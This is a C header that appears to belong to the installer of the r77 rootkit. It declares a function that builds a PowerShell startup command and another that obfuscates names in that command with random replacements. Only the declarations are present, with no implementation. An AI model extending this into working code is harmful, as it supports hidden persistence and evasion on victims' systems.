#pragma comment(linker, "/subsystem:windows")

#include "../r77api.h"
#include "../../vs/Install/resource.h"

/// <summary>
/// Creates the powershell startup command.
/// </summary>
/// <param name="is64Bit">TRUE to return the commandline for 64-bit powershell, FALSE to return the commandline for 32-bit powershell.</param>
/// <returns>
/// A newly allocated LPCSTR with the powershell command.
/// </returns>
LPWSTR GetPowershellCommand(BOOL is64Bit);
/// <summary>
/// Obfuscates all occurrences of a given name within a LPWSTR.
/// </summary>
/// <param name="str">The LPWSTR to obfuscate.</param>
/// <param name="name">A name that will be replaced with a new, randomized name.</param>
VOID ObfuscateString(LPWSTR str, LPCWSTR name);